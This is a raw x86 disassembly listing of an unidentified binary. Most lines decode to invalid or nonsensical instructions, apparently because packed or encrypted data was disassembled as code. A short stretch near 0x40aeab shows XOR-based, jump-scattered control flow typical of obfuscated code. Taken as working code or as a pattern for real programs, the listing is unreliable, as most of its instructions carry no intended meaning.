  40a83f:	loopne 0x40a803
  40a841:	ret    
  40a842:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a843:	sbb    ebx,DWORD PTR [eax]
  40a845:	adc    eax,DWORD PTR [edx]
  40a847:	lods   al,BYTE PTR ds:[esi]
  40a848:	xor    DWORD PTR [ebx+ebx*8],edx
  40a84b:	shl    BYTE PTR [ecx],0x46
  40a84e:	or     eax,0xca8ce08a
  40a853:	in     eax,0x8b
  40a855:	cmp    DWORD PTR [ebp+ecx*4-0x734d67e6],esi
  40a85c:	xchg   esp,eax
  40a85d:	sub    esp,DWORD PTR [edx-0x5addf3cd]
  40a863:	xor    eax,DWORD PTR [edi+0x51da001a]
  40a869:	jo     0x40a886
  40a86b:	repz rcr DWORD PTR [ebp+0x58b8bfae],cl
  40a872:	xlat   BYTE PTR ds:[ebx]
  40a873:	mov    ds:0x557b791e,al
  40a878:	adc    bh,BYTE PTR [ebx+0x63]
  40a87b:	test   DWORD PTR [ebx],0x5a1bbe97
  40a881:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a882:	ret    
  40a883:	push   ds
  40a884:	aad    0x3b
  40a886:	mov    WORD PTR [ecx],ds
  40a888:	hlt    
  40a889:	add    eax,0xa08391af
  40a88e:	loope  0x40a821
  40a890:	sub    eax,0x4e9fb4a5
  40a895:	and    eax,0x2b80884e
  40a89a:	add    ch,0x5b
  40a89d:	retf   
  40a89e:	enter  0xcc2f,0x2c
  40a8a2:	mov    eax,0xb5811249
  40a8a7:	icebp  
  40a8a8:	push   esp
  40a8a9:	mov    ch,0x5f
  40a8ab:	push   esp
  40a8ac:	in     eax,dx
  40a8ad:	(bad)  
  40a8ae:	lock (bad) 
  40a8b0:	cwde   
  40a8b1:	popa   
  40a8b2:	out    dx,eax
  40a8b3:	mov    al,ds:0x2c129eb7
  40a8b8:	int3   
  40a8b9:	clc    
  40a8ba:	mov    gs,WORD PTR [ebx]
  40a8bc:	jbe    0x40a856
  40a8be:	pop    edi
  40a8bf:	sbb    al,0xfd
  40a8c1:	(bad)  
  40a8c2:	inc    BYTE PTR [esi-0x4e56981f]
  40a8c8:	cdq    
  40a8c9:	es cmp al,0x19
  40a8cc:	cld    
  40a8cd:	mov    DWORD PTR [esi+0x67],ecx
  40a8d0:	mov    al,ds:0x13ef726f
  40a8d5:	push   0x95fea6ba
  40a8da:	cli    
  40a8db:	jle    0x40a94e
  40a8dd:	(bad)  
  40a8e0:	outs   dx,BYTE PTR ds:[esi]
  40a8e1:	pop    ss
  40a8e2:	cwde   
  40a8e3:	retf   0xc795
  40a8e6:	jg     0x40a953
  40a8e8:	xchg   edx,esi
  40a8ea:	in     eax,dx
  40a8eb:	push   ecx
  40a8ec:	addr16 (bad) 
  40a8ee:	stc    
  40a8ef:	push   es
  40a8f0:	mov    ch,0x4a
  40a8f2:	cmp    BYTE PTR [esi],bh
  40a8f4:	std    
  40a8f5:	frstor [ecx-0x1a]
  40a8f8:	push   0xa3b2301c
  40a8fd:	loopne 0x40a95b
  40a8ff:	jbe    0x40a8a6
  40a901:	or     cl,BYTE PTR [edi]
  40a903:	or     BYTE PTR [eax+0x6dbc48e6],0x8c
  40a90a:	js     0x40a8c8
  40a90c:	inc    ebp
  40a90d:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a90f:	and    bl,ch
  40a911:	outs   dx,DWORD PTR ds:[esi]
  40a912:	push   cs
  40a913:	sbb    edx,esi
  40a915:	aad    0x4d
  40a917:	pop    edx
  40a918:	jb     0x40a92e
  40a91a:	shr    DWORD PTR [edi-0x1b6cfd87],cl
  40a920:	bnd jge 0x40a959
  40a923:	sbb    bl,BYTE PTR [esi-0x313aa975]
  40a929:	sub    DWORD PTR [ecx+0x73],esp
  40a92c:	outs   dx,BYTE PTR ds:[esi]
  40a92d:	stos   DWORD PTR es:[edi],eax
  40a92e:	clc    
  40a92f:	fild   QWORD PTR [edi+0x4ee98a1a]
  40a935:	sbb    edx,ecx
  40a937:	aaa    
  40a938:	aam    0xad
  40a93a:	add    eax,0x6d4e6839
  40a93f:	inc    esp
  40a940:	popf   
  40a941:	xchg   ebp,eax
  40a942:	std    
  40a943:	in     eax,0xff
  40a945:	inc    edi
  40a946:	cmp    al,0x7b
  40a948:	mov    ah,0x7a
  40a94a:	les    ebx,FWORD PTR [edi+ecx*1+0x757a233d]
  40a951:	xchg   ebx,eax
  40a952:	jbe    0x40a948
  40a954:	(bad)  
  40a955:	mov    ds:0xdcc67baf,eax
  40a95a:	add    ch,cl
  40a95c:	mov    ebx,0x9c9d3f14
  40a961:	push   ds
  40a962:	iret   
  40a963:	add    ebx,DWORD PTR [ebp+0x6f]
  40a966:	ja     0x40a9de
  40a968:	sub    bh,BYTE PTR [edi]
  40a96a:	out    0x7f,al
  40a96c:	sbb    BYTE PTR [eax-0x3],dl
  40a96f:	mov    ebp,0x5e664937
  40a974:	sub    BYTE PTR [edx+edx*2-0x5ecbcd88],dl
  40a97b:	out    0x23,eax
  40a97d:	fcomp  DWORD PTR [ecx]
  40a97f:	ret    0xf44b
  40a982:	pushf  
  40a983:	mov    ebx,0x581f3d4b
  40a988:	jmp    0x85df:0x6c79b54b
  40a98f:	xor    BYTE PTR [ebp+0x7a],ch
  40a992:	mov    bh,0xc9
  40a994:	fwait
  40a995:	(bad)  
  40a996:	leave  
  40a997:	jb     0x40a973
  40a999:	adc    eax,0xe0460812
  40a99e:	adc    BYTE PTR [ebx+0x60],0xa4
  40a9a2:	and    BYTE PTR [edx-0x3],ch
  40a9a5:	xchg   edx,ecx
  40a9a7:	sbb    dh,BYTE PTR [esi-0x1beb679b]
  40a9ad:	bswap  ebp
  40a9af:	shl    DWORD PTR [ebp-0x60e43686],1
  40a9b5:	sbb    bl,BYTE PTR [eax+edx*8+0x1fd96b01]
  40a9bc:	jle    0x40a9fa
  40a9be:	aad    0x84
  40a9c0:	and    eax,0x6425bf66
  40a9c5:	in     al,dx
  40a9c6:	stc    
  40a9c7:	xor    al,0x36
  40a9c9:	dec    ecx
  40a9ca:	adc    ecx,DWORD PTR [esi-0xc]
  40a9cd:	add    al,0xfb
  40a9cf:	adc    DWORD PTR [edx+0x2819f003],0xffffffb1
  40a9d6:	xchg   BYTE PTR [ecx-0x7f4244c],al
  40a9dc:	mov    dl,0xf9
  40a9de:	cmp    eax,DWORD PTR [eax-0x1c459a97]
  40a9e4:	mov    ds:0xdc55cbb7,al
  40a9e9:	xchg   ecx,eax
  40a9ea:	in     eax,dx
  40a9eb:	mov    BYTE PTR [ecx+0x2d587ab],cl
  40a9f1:	fs xchg ebp,eax
  40a9f3:	add    al,0xc3
  40a9f5:	das    
  40a9f6:	ret    
  40a9f7:	cmc    
  40a9f8:	dec    esp
  40a9f9:	ret    0xdd05
  40a9fc:	add    bh,BYTE PTR [ebx+0x13]
  40a9ff:	sbb    dl,dh
  40aa01:	jge    0x40a995
  40aa03:	icebp  
  40aa04:	jne    0xba26a2e3
  40aa0a:	rol    BYTE PTR ds:[edi-0x22],cl
  40aa0e:	mov    BYTE PTR [ecx+0x5ca69088],cl
  40aa14:	adc    BYTE PTR [ebp-0x28],bl
  40aa17:	and    ch,dh
  40aa19:	gs stos BYTE PTR es:[edi],al
  40aa1b:	push   ds
  40aa1c:	jmp    0xcd74cd19
  40aa21:	adc    BYTE PTR [eax],0x6c
  40aa24:	nop
  40aa25:	pop    es
  40aa26:	xchg   edx,eax
  40aa27:	nop
  40aa28:	out    0x5b,eax
  40aa2a:	stos   BYTE PTR es:[edi],al
  40aa2b:	push   cs
  40aa2c:	call   0xd6bc0f55
  40aa31:	ss jb  0x40a9b5
  40aa34:	arpl   WORD PTR [ecx],ax
  40aa36:	sub    DWORD PTR [ebx],ebp
  40aa38:	dec    eax
  40aa39:	mov    dl,0xb4
  40aa3b:	sbb    esp,DWORD PTR [ebp+0x349f57c8]
  40aa41:	arpl   WORD PTR [eax-0x4e],sp
  40aa44:	mov    edi,0x13fe78d2
  40aa49:	mov    cl,0x24
  40aa4b:	sbb    BYTE PTR ds:0xcb6bbc04,bh
  40aa51:	jb     0x40aaa3
  40aa53:	sbb    esp,0x5e
  40aa56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa57:	or     eax,0x17b65686
  40aa5c:	xchg   ebp,eax
  40aa5d:	xchg   ecx,eax
  40aa5e:	mov    ch,0xd7
  40aa60:	in     eax,0x36
  40aa62:	adc    eax,0x12610505
  40aa67:	imul   ecx,DWORD PTR ds:[edx-0x42],0xff481283
  40aa6f:	mov    ah,0xc9
  40aa71:	pop    ebp
  40aa72:	pop    eax
  40aa73:	mov    esi,edx
  40aa75:	ins    BYTE PTR es:[edi],dx
  40aa76:	or     esi,DWORD PTR [esi+edi*2-0x688906f5]
  40aa7d:	into   
  40aa7e:	repnz imul ebx,DWORD PTR [ebx-0x21],0xb1bca5c1
  40aa86:	fsub   QWORD PTR [ebp+0x46]
  40aa89:	sar    DWORD PTR [ebp-0x26a26a92],0xf6
  40aa90:	mov    edi,DWORD PTR [ebp+0x5253cac5]
  40aa96:	(bad)  
  40aa97:	dec    eax
  40aa98:	fldlg2 
  40aa9a:	in     al,0x5d
  40aa9c:	ds pop ss
  40aa9e:	jb     0x40aa6c
  40aaa0:	adc    edx,DWORD PTR [ecx]
  40aaa2:	rcl    ecx,0xdf
  40aaa5:	xor    DWORD PTR [eax],0xda079a15
  40aaab:	das    
  40aaac:	cmp    DWORD PTR [edi],0x12635a54
  40aab2:	inc    edi
  40aab3:	fidiv  WORD PTR [esi-0x42]
  40aab6:	mov    ds:0x5983b384,al
  40aabb:	mov    esi,0x8841ec9a
  40aac0:	aas    
  40aac1:	mov    ch,0x22
  40aac3:	jnp    0x40aadd
  40aac5:	mov    cl,bl
  40aac7:	lods   al,BYTE PTR ds:[esi]
  40aac8:	jmp    ebp
  40aaca:	mov    edx,0xaa29717e
  40aacf:	mov    ah,0x78
  40aad1:	lods   eax,DWORD PTR ds:[esi]
  40aad2:	arpl   WORD PTR [esi+0x21],sp
  40aad5:	cdq    
  40aad6:	mov    esi,0xb5c05608
  40aadb:	push   es
  40aadc:	pop    eax
  40aadd:	popf   
  40aade:	push   ds
  40aadf:	dec    esp
  40aae0:	mov    eax,0x1d032271
  40aae5:	dec    esp
  40aae6:	fldcw  WORD PTR [edx]
  40aae8:	lods   al,BYTE PTR ds:[esi]
  40aae9:	and    al,0xa1
  40aaeb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aaec:	in     al,0x8d
  40aaee:	shl    DWORD PTR [esi+0x2f],cl
  40aaf1:	(bad)  
  40aaf2:	ins    DWORD PTR es:[edi],dx
  40aaf3:	pop    ebx
  40aaf4:	nop
  40aaf5:	mov    DWORD PTR [ebx-0x1cd88ee2],ecx
  40aafb:	jg     0x40aaed
  40aafd:	xchg   BYTE PTR [ecx-0x1ddc05c3],dh
  40ab03:	mov    edi,0xb5969b89
  40ab08:	push   edx
  40ab09:	scas   al,BYTE PTR es:[edi]
  40ab0a:	jb     0x40ab62
  40ab0c:	cld    
  40ab0d:	aam    0x1
  40ab0f:	(bad)  
  40ab11:	out    0x3d,al
  40ab13:	mov    bl,0x78
  40ab15:	jmp    DWORD PTR [edx+ebx*4-0x4d]
  40ab19:	sbb    al,0x3b
  40ab1b:	outs   dx,DWORD PTR ds:[esi]
  40ab1c:	jmp    FWORD PTR [ebx-0x7e590cc5]
  40ab22:	shr    DWORD PTR [edx-0x593f5876],0x5e
  40ab29:	test   al,0x33
  40ab2b:	test   eax,0x1a45bf74
  40ab30:	retf   
  40ab31:	jg     0x40ab34
  40ab33:	(bad)  
  40ab35:	push   ecx
  40ab36:	mov    DWORD PTR [ecx],edx
  40ab38:	and    ah,BYTE PTR [ebp+ebp*4+0x22]
  40ab3c:	int    0xe0
  40ab3e:	xchg   DWORD PTR [esi-0x346060a9],edx
  40ab44:	inc    ebp
  40ab45:	jmp    0xea15:0xc012cb9c
  40ab4c:	cli    
  40ab4d:	hlt    
  40ab4e:	push   ss
  40ab4f:	sub    DWORD PTR [eax+0x2b0d4e44],esi
  40ab55:	sti    
  40ab56:	fnsave [edx+0x263e5336]
  40ab5c:	jbe    0x40ab72
  40ab5e:	retf   
  40ab5f:	mov    BYTE PTR [edx],dh
  40ab61:	outs   dx,BYTE PTR ds:[esi]
  40ab62:	inc    edi
  40ab63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab64:	dec    esi
  40ab65:	cmp    ah,BYTE PTR [eax-0x4d]
  40ab68:	test   eax,0x252ec971
  40ab6d:	pop    ebp
  40ab6e:	out    dx,al
  40ab6f:	cmp    al,0xe6
  40ab71:	cmp    BYTE PTR [ebx],bl
  40ab73:	addr16 jmp 0x690c:0xaadf47c
  40ab7b:	mov    WORD PTR [ecx-0x63],?
  40ab7e:	jns    0x40ab94
  40ab80:	aad    0xfc
  40ab82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab83:	adc    DWORD PTR [esi],edi
  40ab85:	mov    al,0x39
  40ab87:	inc    ebp
  40ab88:	imul   ebx,DWORD PTR [edx-0x797c6f3b],0xffffff93
  40ab8f:	mov    gs,WORD PTR [edx+0xd]
  40ab92:	out    0x66,eax
  40ab94:	push   edx
  40ab95:	adc    BYTE PTR [esi+0x2208a386],ch
  40ab9b:	dec    esi
  40ab9c:	jo     0x40ab9c
  40ab9e:	fistp  DWORD PTR ds:0xa259348d
  40aba4:	dec    ecx
  40aba5:	sar    BYTE PTR [ebx+eax*4+0x50],cl
  40aba9:	pop    eax
  40abaa:	dec    ebx
  40abab:	hlt    
  40abac:	ins    BYTE PTR es:[edi],dx
  40abad:	outs   dx,BYTE PTR ds:[esi]
  40abae:	(bad)  
  40abaf:	sqrtps xmm5,XMMWORD PTR [esi]
  40abb2:	mov    eax,DWORD PTR [edx+ebx*4]
  40abb5:	stc    
  40abb6:	rcr    DWORD PTR [edx],0xe7
  40abb9:	jmp    0x1a1f:0x75092023
  40abc0:	ss push ebp
  40abc2:	ret    0x898f
  40abc5:	pop    ds
  40abc6:	gs push edx
  40abc8:	rcl    BYTE PTR [ecx+0x23b4860b],cl
  40abce:	arpl   sp,bx
  40abd0:	xor    ah,cl
  40abd2:	aad    0x4d
  40abd4:	mov    WORD PTR [ebp-0x80],?
  40abd7:	fisubr DWORD PTR [edx+ebx*1+0x39de0b7a]
  40abde:	(bad)  
  40abdf:	stc    
  40abe0:	inc    esp
  40abe1:	cdq    
  40abe2:	push   esi
  40abe3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40abe4:	imul   ecx,edx,0x5b
  40abe7:	jmp    0x37f3f4e3
  40abec:	cdq    
  40abed:	dec    ecx
  40abee:	ror    DWORD PTR [ebx+eax*4-0x37],cl
  40abf2:	mov    al,0xa6
  40abf4:	mov    ebp,DWORD PTR [ebx+0x36]
  40abf7:	adc    DWORD PTR [ebx+esi*4],0x5b
  40abfb:	je     0x40ac12
  40abfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40abfe:	jp     0x40abeb
  40ac00:	pop    esp
  40ac01:	push   ss
  40ac02:	inc    ebp
  40ac03:	hlt    
  40ac04:	cld    
  40ac05:	clc    
  40ac06:	jmp    0xbea:0x7ba5b137
  40ac0d:	retf   0xafe7
  40ac10:	inc    ecx
  40ac11:	dec    edx
  40ac13:	dec    edi
  40ac14:	mov    esi,0x32e160dd
  40ac19:	shr    DWORD PTR [esi+0x22],0x57
  40ac1d:	ffree  st(4)
  40ac1f:	mov    BYTE PTR [edi-0x2e],dh
  40ac22:	outs   dx,BYTE PTR ds:[esi]
  40ac23:	mov    ebx,0xdb76f2e8
  40ac28:	scas   al,BYTE PTR es:[edi]
  40ac29:	lds    ecx,FWORD PTR [edi]
  40ac2b:	mov    eax,0x94e7f23e
  40ac30:	push   ecx
  40ac31:	shl    DWORD PTR [ebp+eax*2-0x228458e4],cl
  40ac38:	ss (bad) 
  40ac3a:	push   esp
  40ac3b:	fwait
  40ac3c:	cmp    BYTE PTR [ebp-0x4b],al
  40ac3f:	in     eax,0xd3
  40ac41:	test   eax,0xd33a1b33
  40ac46:	ins    DWORD PTR es:[edi],dx
  40ac47:	in     al,0xc5
  40ac49:	or     DWORD PTR [ebp-0x6f],esp
  40ac4c:	inc    eax
  40ac4d:	cs cmc 
  40ac4f:	and    edi,DWORD PTR [eax-0x15e05574]
  40ac55:	inc    edi
  40ac56:	retf   0xaa8e
  40ac59:	inc    esp
  40ac5a:	lahf   
  40ac5b:	pop    ebx
  40ac5c:	xchg   edi,eax
  40ac5d:	jge    0x40ac93
  40ac5f:	stos   DWORD PTR es:[edi],eax
  40ac60:	idiv   ecx
  40ac62:	xor    al,0x43
  40ac64:	cwde   
  40ac65:	repz std 
  40ac67:	ret    
  40ac68:	icebp  
  40ac69:	jns    0x40acce
  40ac6b:	xchg   BYTE PTR [edx+0x15],bh
  40ac6e:	adc    BYTE PTR [ebx+esi*2],bl
  40ac71:	mov    ebp,DWORD PTR [ecx+0x12bb56e4]
  40ac77:	inc    esp
  40ac78:	sbb    DWORD PTR [esi+0x38e6eded],eax
  40ac7e:	cs adc ah,bh
  40ac81:	dec    esi
  40ac82:	jo     0x40ace5
  40ac84:	sub    esp,DWORD PTR [eax+eax*4-0x29]
  40ac88:	pushf  
  40ac89:	fiadd  DWORD PTR [eax+0x58c164b9]
  40ac8f:	(bad)  
  40ac90:	pop    ss
  40ac91:	repz fisttp DWORD PTR [ebp-0x6e]
  40ac95:	lahf   
  40ac96:	sti    
  40ac97:	cmp    eax,0x3994ff30
  40ac9c:	(bad)  
  40ac9e:	pop    ebx
  40ac9f:	lods   eax,DWORD PTR ds:[esi]
  40aca0:	mov    eax,0xe0fde14b
  40aca5:	cwde   
  40aca6:	cmp    eax,0x4211aac6
  40acab:	dec    ebp
  40acac:	jnp    0x40ac8e
  40acae:	das    
  40acaf:	xchg   edi,eax
  40acb0:	shl    bh,1
  40acb2:	push   ebx
  40acb3:	jmp    DWORD PTR [edi-0x26e5edca]
  40acb9:	adc    eax,0x4f6f0994
  40acbe:	outs   dx,BYTE PTR ds:[esi]
  40acbf:	fcomp  DWORD PTR [ebp-0x66]
  40acc2:	add    ah,BYTE PTR [edi]
  40acc4:	and    dh,BYTE PTR [edi]
  40acc6:	jo     0x40ad33
  40acc8:	sahf   
  40acc9:	dec    esi
  40acca:	mov    cl,0xc5
  40accc:	inc    ebx
  40accd:	ror    BYTE PTR [ebp-0x54],cl
  40acd0:	or     al,0x3d
  40acd2:	(bad)  
  40acd4:	xchg   DWORD PTR [eax+0x2e],edx
  40acd7:	ret    0x65c8
  40acda:	repnz dec esi
  40acdc:	ss and al,0xcf
  40acdf:	or     edx,DWORD PTR [ebx]
  40ace1:	inc    esi
  40ace2:	cmp    BYTE PTR [ebx],ch
  40ace4:	cmp    eax,DWORD PTR [esi-0x13]
  40ace7:	sub    al,0x95
  40ace9:	popf   
  40acea:	push   esi
  40aceb:	rcl    BYTE PTR [ecx-0x3d],cl
  40acee:	retf   0x8b3a
  40acf1:	inc    esi
  40acf2:	adc    cl,BYTE PTR [ebx-0x38]
  40acf5:	call   0x4fb5:0xd9bb62d3
  40acfc:	dec    esi
  40acfd:	jb     0x40ac99
  40acff:	inc    eax
  40ad00:	push   0xffffffd3
  40ad02:	mov    dl,0x46
  40ad04:	xor    BYTE PTR [edx-0x74b9d19a],al
  40ad0a:	je     0x40ad5f
  40ad0c:	inc    ebp
  40ad0d:	outs   dx,DWORD PTR ds:[esi]
  40ad0e:	fwait
  40ad0f:	into   
  40ad10:	mov    ds:0x71399de1,eax
  40ad15:	aam    0x52
  40ad17:	adc    DWORD PTR [bx+si-0x32],eax
  40ad1b:	out    0x45,eax
  40ad1d:	mov    ah,0x83
  40ad1f:	jmp    0x40ace0
  40ad21:	inc    esp
  40ad22:	ficomp WORD PTR [edx+0x64e8bb0c]
  40ad28:	xchg   esp,eax
  40ad29:	aaa    
  40ad2a:	das    
  40ad2b:	lods   al,BYTE PTR ds:[esi]
  40ad2c:	pop    ds
  40ad2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad2e:	cmp    edx,0x95081140
  40ad34:	fwait
  40ad35:	(bad)  
  40ad38:	push   cs
  40ad39:	popa   
  40ad3a:	mov    ah,0xb2
  40ad3c:	adc    dh,BYTE PTR [edx+ebx*4+0x403e61fe]
  40ad43:	clc    
  40ad44:	xchg   DWORD PTR [ecx+0x39],eax
  40ad47:	push   ss
  40ad48:	add    edi,DWORD PTR [edx+0x57]
  40ad4b:	xchg   edx,eax
  40ad4c:	cwde   
  40ad4d:	or     eax,0x43fb3327
  40ad52:	aaa    
  40ad53:	je     0x40acf6
  40ad55:	jecxz  0x40ad6b
  40ad57:	adc    eax,0xded34f3
  40ad5c:	in     al,dx
  40ad5d:	retf   
  40ad5e:	sbb    ebp,DWORD PTR [ecx]
  40ad60:	mov    cl,0x25
  40ad62:	inc    ebx
  40ad63:	jecxz  0x40ace7
  40ad65:	mov    DWORD PTR [ebp-0x10],0x206d66d2
  40ad6c:	jmp    0x93846256
  40ad71:	rcr    BYTE PTR [esi+0x75467025],0xd5
  40ad78:	pop    eax
  40ad79:	xchg   ebp,eax
  40ad7a:	fwait
  40ad7b:	int3   
  40ad7c:	jl     0x40ad5e
  40ad7e:	inc    edi
  40ad7f:	mov    ah,0xdf
  40ad81:	fldcw  WORD PTR [esi]
  40ad83:	and    al,0xbc
  40ad85:	mov    dh,0x56
  40ad87:	push   0xe4cc1ed6
  40ad8c:	mov    bl,0x1d
  40ad8e:	int    0x5e
  40ad90:	push   edi
  40ad91:	aad    0x40
  40ad93:	jle    0x40ad59
  40ad95:	jle    0x40adb2
  40ad97:	sti    
  40ad98:	ret    0x863d
  40ad9b:	add    DWORD PTR [ebx],esi
  40ad9d:	mov    dl,0xfa
  40ad9f:	mov    dx,0x37ef
  40ada3:	jb     0x40ad51
  40ada5:	lods   eax,DWORD PTR ds:[esi]
  40ada6:	das    
  40ada7:	xchg   BYTE PTR [edi-0x47db8e28],dl
  40adad:	mov    dl,0x1c
  40adaf:	fs sbb ecx,DWORD PTR ss:[edx-0x9]
  40adb4:	ss rcr ecx,0xc9
  40adb8:	push   0x5427240d
  40adbd:	xor    eax,0xffffffbc
  40adc0:	out    dx,eax
  40adc1:	cli    
  40adc2:	jae    0x40ad95
  40adc4:	in     eax,dx
  40adc5:	pop    ebx
  40adc6:	sbb    DWORD PTR [edx-0x29],esi
  40adc9:	mov    esi,0x7c7e71b6
  40adcf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40add0:	les    edi,FWORD PTR [ebx+0xd]
  40add3:	imul   ebp,DWORD PTR [esi+0x4b],0xffffffc7
  40add7:	lods   eax,DWORD PTR ds:[esi]
  40add8:	lds    edi,FWORD PTR [ecx+eax*2]
  40addb:	mov    eax,0x15162005
  40ade0:	dec    edi
  40ade1:	mov    ds:0xccc80808,eax
  40ade6:	cmp    BYTE PTR [ebp+0x751468f9],0x25
  40aded:	or     BYTE PTR ds:0x74c8729b,ah
  40adf3:	mov    ch,0x7c
  40adf5:	fs pusha 
  40adf7:	out    dx,al
  40adf8:	adc    al,0x8b
  40adfa:	push   esp
  40adfb:	mov    bl,BYTE PTR [eax-0x45]
  40adfe:	xchg   edx,eax
  40adff:	es mov dh,0xc3
  40ae02:	adc    eax,0x8e1931bd
  40ae07:	cmp    DWORD PTR [ecx+0x41],ebx
  40ae0a:	lahf   
  40ae0b:	pop    ebp
  40ae0c:	mov    esp,0x87892e94
  40ae11:	pop    ebp
  40ae12:	pop    esi
  40ae13:	ss or  esp,ecx
  40ae16:	ja     0x40ae1a
  40ae18:	aas    
  40ae19:	or     ah,cl
  40ae1b:	(bad)  
  40ae1c:	jg     0x40ae0c
  40ae1e:	pop    edi
  40ae1f:	rcl    DWORD PTR [ecx],0xd1
  40ae22:	cmp    BYTE PTR [ebx],dh
  40ae24:	stos   DWORD PTR es:[edi],eax
  40ae25:	sub    eax,0xe4d839ed
  40ae2a:	mov    edi,0x774109a6
  40ae2f:	aam    0x6b
  40ae31:	(bad)  
  40ae32:	in     al,0xc8
  40ae34:	cmp    ebx,esi
  40ae36:	cmp    eax,0xa557b035
  40ae3b:	xlat   BYTE PTR ds:[ebx]
  40ae3c:	pop    edx
  40ae3d:	jg     0x40ae81
  40ae3f:	stos   BYTE PTR es:[edi],al
  40ae40:	sub    eax,0xdb09b91e
  40ae45:	icebp  
  40ae46:	xchg   dl,cl
  40ae48:	mov    eax,ds:0xbba763db
  40ae4d:	cdq    
  40ae4e:	pop    esp
  40ae4f:	cmp    bh,BYTE PTR [edi-0x2f483c37]
  40ae55:	aaa    
  40ae56:	add    BYTE PTR [ebp+0x28be37f0],0x61
  40ae5d:	call   0xfa5f65ee
  40ae62:	sbb    al,0x24
  40ae64:	pop    ss
  40ae65:	sub    edi,DWORD PTR [eax+0x4de37de]
  40ae6b:	and    ecx,ecx
  40ae6d:	loop   0x40aeaf
  40ae6f:	mov    bh,0x54
  40ae71:	mov    DWORD PTR [esi],edi
  40ae73:	out    0xe5,eax
  40ae75:	mov    bl,0x55
  40ae77:	repz mov ds:0x290c1efb,eax
  40ae7d:	push   ds
  40ae7e:	rol    BYTE PTR [esi],1
  40ae80:	jge    0x40ae4a
  40ae82:	mov    edi,es
  40ae84:	jmp    0x4d16:0xfb99e20
  40ae8b:	dec    esi
  40ae8c:	dec    ebp
  40ae8d:	add    BYTE PTR [eax-0x67],0xcd
  40ae91:	jp     0x40aeee
  40ae93:	jge    0x40ae55
  40ae95:	sbb    dh,BYTE PTR [edx-0x40f25622]
  40ae9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae9c:	add    ebx,esp
  40ae9e:	mov    esi,0x342cd419
  40aea3:	sub    edi,DWORD PTR [ecx-0x75daac36]
  40aea9:	inc    ebp
  40aeaa:	(bad)  
  40aeab:	movzx  eax,WORD PTR [eax+ebx*2]
  40aeaf:	mov    ecx,DWORD PTR [ebp-0x14]
  40aeb2:	mov    eax,DWORD PTR [ecx+eax*4]
  40aeb5:	mov    DWORD PTR [ebp-0x38],eax
  40aeb8:	jmp    0x408aae
  40aebd:	mov    eax,DWORD PTR [ebp-0xc]
  40aec0:	xor    eax,esi
  40aec2:	lea    ebx,[ebx+eax*1+0x3272fa]
  40aec9:	jmp    0x4087a7
  40aece:	mov    eax,DWORD PTR [ebp-0x4]
  40aed1:	xor    eax,esi
  40aed3:	add    eax,edi
  40aed5:	jmp    0x40d3b1
  40aeda:	mov    eax,DWORD PTR [ebp-0x38]
  40aedd:	add    eax,DWORD PTR [ebp+0x8]
  40aee0:	mov    DWORD PTR [ebp-0x18],eax
  40aee3:	jmp    0x40d298
  40aee8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aee9:	fisubr WORD PTR [esi]
  40aeeb:	jbe    0x40af63
  40aeed:	jbe    0x40aed6
  40aeef:	outs   dx,BYTE PTR ds:[esi]
  40aef0:	xchg   BYTE PTR [ebx-0x4b7558d0],al
  40aef6:	(bad)  
  40aef8:	or     BYTE PTR [ecx],0x7b
  40aefb:	jnp    0x40af10
  40aefd:	pushf  
  40aefe:	jnp    0x40af7b
  40af00:	pop    eax
  40af01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af02:	dec    ecx
  40af03:	jp     0x40af29
  40af05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af06:	mov    ebp,0x516a2d5b
  40af0b:	test   eax,0xbafbd675
  40af10:	xchg   BYTE PTR [ebx-0x54d42894],cl
  40af16:	inc    ebx
  40af17:	mov    BYTE PTR [edi],al
  40af19:	mov    bl,0x1a
  40af1b:	and    cl,ch
  40af1d:	push   ss
  40af1e:	call   0x892c24e5
  40af23:	cmp    al,0x11
  40af25:	outs   dx,BYTE PTR ds:[esi]
  40af26:	or     bl,ch
  40af28:	inc    esp
  40af29:	out    0xf,eax
  40af2b:	mov    ds:0xb9c00f22,al
  40af30:	cmp    eax,DWORD PTR [ebx+0x5a]
  40af33:	sub    BYTE PTR [ebx+edx*2],cl
  40af36:	leave  
  40af37:	in     al,dx
  40af38:	out    0x23,eax
  40af3a:	sub    DWORD PTR [esi+ebp*1+0x45],edi
  40af3e:	mov    dl,0xd1
  40af40:	lock and eax,0x2d780991
  40af46:	push   0x29
  40af48:	xor    BYTE PTR [ecx+0x6c993fba],al
  40af4e:	stos   DWORD PTR es:[edi],eax
  40af4f:	or     cl,BYTE PTR [ebp+ebx*1+0x17c938a0]
  40af56:	popf   
  40af57:	jne    0x40af55
  40af59:	jb     0x40af4d
  40af5b:	dec    ecx
  40af5c:	xchg   DWORD PTR [edx],ecx
  40af5e:	jp     0x40af11
  40af60:	inc    ebp
  40af61:	lods   al,BYTE PTR ds:[esi]
  40af62:	sti    
  40af63:	rcl    BYTE PTR [ecx],0x1e
  40af66:	cli    
  40af67:	in     al,0xf2
  40af69:	mov    fs,WORD PTR [eax]
  40af6b:	push   ds
  40af6c:	sar    BYTE PTR [ecx],0xbd
  40af6f:	icebp  
  40af70:	fucomi st,st(7)
  40af72:	aad    0x3b
  40af74:	lods   al,BYTE PTR ds:[esi]
  40af75:	inc    edi
  40af76:	jle    0x40af05
  40af78:	inc    edi
  40af79:	int    0x4f
  40af7b:	jmp    0xa6cf:0x1ae7ebb3
  40af82:	mov    edx,0x1f470789
  40af87:	aaa    
  40af88:	test   dl,dh
  40af8a:	xchg   BYTE PTR [ebx-0x77],cl
  40af8d:	sub    bl,BYTE PTR [edi]
  40af8f:	pop    ds
  40af90:	push   ebx
  40af91:	sbb    ebx,esi
  40af93:	push   edi
